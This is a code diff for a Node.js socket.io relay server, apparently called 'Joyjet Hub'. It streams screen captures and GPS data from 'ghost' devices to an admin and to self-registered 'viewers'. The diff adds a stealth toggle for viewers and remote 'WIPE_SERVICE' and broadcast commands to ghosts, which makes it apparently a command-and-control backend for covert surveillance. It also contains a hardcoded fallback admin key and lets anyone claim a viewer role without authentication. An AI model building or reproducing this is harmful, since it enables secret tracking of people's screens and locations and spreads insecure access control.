@@ -1,3 +1,4 @@
+require('dotenv').config(); 
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -6,131 +7,126 @@ const axios = require('axios');
 const app = express();
 const server = http.createServer(app);
 
-// 1. PERFORMANCE CONFIG (100MB Buffer for Screen Stream)
+// 1. HIGH-PERFORMANCE ENGINE CONFIG
+// 100MB buffer for HD frames + optimized ping for mobile stability
 const io = new Server(server, {
   maxHttpBufferSize: 1e8, 
-  pingTimeout: 60000,
+  pingInterval: 10000,
+  pingTimeout: 5000,
   cors: { origin: "*" }
 });
 
-// 2. VIEWER PERMISSIONS MAPPING (Update these names to match your users)
-const viewerPermissions = {
-    "Viewer_John": ["Ghost_Alpha", "Ghost_Beta", "Ghost_Gamma"],
-    "Viewer_Sarah": ["Ghost_Delta", "Ghost_Epsilon"]
-};
-
-// 3. RENDER KEEP-ALIVE (Self-Ping every 10 mins)
+// 2. SECURITY & CONFIG
 const PUBLIC_URL = "https://joyjet-server.onrender.com";
-let lastActiveTime = Date.now();
+const ADMIN_KEY = process.env.ADMIN_SECRET_KEY || "GURU_8310"; 
+let viewers = new Map(); // Tracks active viewer sessions
 
+// 3. RENDER KEEP-ALIVE (Self-Heartbeat)
 setInterval(async () => {
   try {
     await axios.get(PUBLIC_URL);
-    console.log('Heartbeat: Server is awake.');
+    console.log('Heartbeat: System Active');
   } catch (err) {
-    console.log('Heartbeat: Pulse sent.');
+    console.log('Heartbeat: Pulse Sent');
   }
-}, 600000); 
+}, 600000); // 10 Minutes
 
-// 4. CONNECTION HANDLING
-let activeAdmin = null;
-let viewers = new Map(); // socketId -> { name, hidden: false }
-let ghosts = new Map();  // socketId -> { name }
-
+// 4. MAIN COMMUNICATIONS HUB
 io.on('connection', (socket) => {
   console.log('Node Linked:', socket.id);
 
-  // --- LOGIN LOGIC ---
+  // DYNAMIC ROLE & PERMISSION SYSTEM
+  socket.on('claim_role', (data) => {
+    const nameLower = data.name.trim().toLowerCase();
+    const providedKey = data.key;
 
-  socket.on('claim_admin', (data) => {
-    activeAdmin = socket.id;
-    socket.emit('role_assigned', { role: 'ADMIN', name: data.name });
-    
-    // Alert if server was asleep (> 15 mins)
-    if (Date.now() - lastActiveTime > 900000) {
-        socket.emit('system_alert', { msg: "Server waking up. Ghosts reconnecting..." });
+    // A. ADMIN AUTHENTICATION
+    if (nameLower === "admin") {
+      if (providedKey === ADMIN_KEY) {
+        socket.join("admin_room");
+        socket.emit('role_assigned', { role: 'ADMIN', name: "SYSTEM_MASTER" });
+        console.log("Admin Authorized.");
+      } else {
+        socket.emit('system_alert', { msg: "ACCESS DENIED: INVALID KEY" });
+        socket.disconnect();
+      }
+    } 
+    // B. VIEWER LOGIC (Parent - No underscore)
+    else if (!nameLower.includes('_')) {
+      viewers.set(socket.id, { name: nameLower, hidden: false });
+      socket.join(`viewer_room_${nameLower}`);
+      socket.emit('role_assigned', { role: 'VIEWER', name: data.name });
+      console.log(`Viewer [${data.name}] monitoring assigned nodes.`);
+    } 
+    // C. GHOST LOGIC (Child Node - Has underscore)
+    else {
+      socket.emit('role_assigned', { role: 'GHOST', name: data.name });
+      // Alert Admin that a node is active
+      io.to("admin_room").emit('system_alert', { msg: `Node [${data.name}] Online.` });
     }
   });
 
-  socket.on('claim_viewer', (data) => {
-    viewers.set(socket.id, { name: data.name, hidden: false });
-    socket.emit('role_assigned', { role: 'VIEWER', name: data.name });
-  });
-
-  socket.on('register_user', (data) => {
-    ghosts.set(socket.id, { name: data.name });
-    lastActiveTime = Date.now(); // Reset sleep timer
-    io.emit('system_alert', { msg: `Node [${data.name}] is active.` });
-    socket.emit('role_assigned', { role: 'GHOST', name: data.name });
-  });
-
-  // --- STEALTH & STATUS ---
-
+  // STEALTH TOGGLE (For Viewers)
   socket.on('toggle_visibility', (data) => {
     if (viewers.has(socket.id)) {
-        let vData = viewers.get(socket.id);
-        vData.hidden = data.hidden;
-        viewers.set(socket.id, vData);
+        let v = viewers.get(socket.id);
+        v.hidden = data.hidden;
+        viewers.set(socket.id, v);
     }
   });
 
-  // --- DATA RELAYS (Ghost -> Admin/Viewer) ---
-
+  // HIGH-QUALITY HD RELAY (Ghost -> Admin/Viewer)
   socket.on('screen_frame', (payload) => {
-    // Payload should be { ghostName: "...", frame: "..." }
+    // payload: { ghostName: "Alpha_01", frame: "base64..." }
     
-    // Admin gets everything
-    if (activeAdmin) io.to(activeAdmin).emit('screen_frame', payload);
+    // 1. Always relay to Admin (using volatile for lag-free performance)
+    io.to("admin_room").volatile.emit('screen_frame', payload);
     
-    // Targeted Relay for Viewers
+    // 2. Relay to specific Parent (Viewer)
     viewers.forEach((vData, vSocketId) => {
-        if (!vData.hidden) {
-            const allowed = viewerPermissions[vData.name] || [];
-            if (allowed.includes(payload.ghostName)) {
-                io.to(vSocketId).emit('screen_frame', payload);
-            }
+      if (!vData.hidden) {
+        const prefix = vData.name + "_";
+        if (payload.ghostName.toLowerCase().startsWith(prefix)) {
+          io.to(`viewer_room_${vData.name}`).volatile.emit('screen_frame', payload);
         }
+      }
     });
   });
 
+  // GPS & SENSOR RELAY
   socket.on('ghost_location_data', (payload) => {
-    // Admin gets everything
-    if (activeAdmin) io.to(activeAdmin).emit('ghost_update', payload);
-    
-    // Targeted Relay for Viewers
+    io.to("admin_room").emit('ghost_update', payload);
     viewers.forEach((vData, vSocketId) => {
-        const allowed = viewerPermissions[vData.name] || [];
-        if (allowed.includes(payload.ghostName)) {
-            io.to(vSocketId).emit('ghost_update', payload);
-        }
+      const prefix = vData.name + "_";
+      if (payload.ghostName.toLowerCase().startsWith(prefix)) {
+        io.to(`viewer_room_${vData.name}`).emit('ghost_update', payload);
+      }
     });
   });
 
-  // --- COMMANDS ---
-
-  // Admin Only: Wipe a specific Ghost
-  socket.on('admin_wipe', (targetGhostId) => {
-    if (socket.id === activeAdmin) {
-        io.to(targetGhostId).emit('admin_command', 'WIPE_SERVICE');
-        console.log(`WIPE issued for ${targetGhostId}`);
+  // COMMAND RELAY (Admin -> Ghost/Global)
+  socket.on('admin_wipe', (targetId) => {
+    // Security check: only if sender is in admin_room
+    if (socket.rooms.has("admin_room")) {
+        io.to(targetId).emit('admin_command', 'WIPE_SERVICE');
     }
   });
 
-  // Admin Only: Global Command (START_LIVE, etc)
   socket.on('admin_command', (cmd) => {
-    if (socket.id === activeAdmin) {
+    if (socket.rooms.has("admin_room")) {
         socket.broadcast.emit('admin_command', cmd);
     }
   });
 
+  // DISCONNECT CLEANUP
   socket.on('disconnect', () => {
-    if (socket.id === activeAdmin) activeAdmin = null;
     viewers.delete(socket.id);
-    ghosts.delete(socket.id);
+    console.log('Node Unlinked:', socket.id);
   });
 });
 
-app.get('/', (req, res) => res.send('Joyjet Hub: Active'));
+// SERVER ENTRY POINT
+app.get('/', (req, res) => res.send('Joyjet HQ: Secure Hub Operational'));
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+server.listen(PORT, () => console.log(`Master Server running on port ${PORT}`));
